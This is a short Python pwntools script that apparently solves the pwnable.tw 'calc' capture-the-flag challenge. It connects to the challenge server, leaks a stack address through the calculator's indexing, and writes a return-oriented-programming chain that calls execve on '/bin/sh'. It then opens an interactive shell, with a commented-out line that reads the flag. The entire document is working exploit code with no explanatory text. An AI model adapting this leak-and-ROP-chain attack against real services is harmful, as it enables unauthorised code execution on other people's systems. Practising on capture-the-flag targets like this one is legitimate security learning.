from pwn import *



offsets = ["+361", "+362", "+363", "+364",
           "+365", "+366", "+367", "+368", "+369"]
addresses = [0x0805c34b, 0x0000000b, 0x080701d0, 0x00000000,
             0x00000000, 0x00000000, 0x08049a21, 0x6E69622F, 0x0068732F]

def cal_offset_shell(p):
    p.recv(1024)
    p.send(b"+360\n")
    prev_esb = int(p.recv(1024))
    addresses[5] = prev_esb

def rop(s):
    for i in range(len(addresses)):
        print("[!] Target: %s" % hex(addresses[i]))
        s.send(("%s\n" % offsets[i]).encode("utf-8"))
        
        ori = int(s.recv(1024))
        print("[!] Leak Address: %s" % hex(ori))

        offset = addresses[i] - ori
        print("[!] Offset: %d" % offset)
        
        payload = "%s%+d" % (offsets[i], offset)
        print("[+] Send payload: %s" % payload)
        s.send(payload.encode("utf-8") + b"\n")

        res = hex(int(s.recv(1024)))
        print("====> %s\n===========" % res)
    s.send(b"\n")

program = remote("chall.pwnable.tw", 10100)
cal_offset_shell(program)
rop(program)

program.send(b"\n")
# program.send(b"cat /home/calc/flag\n")
# print(program.recv(1024))
# program.close()
program.interactive()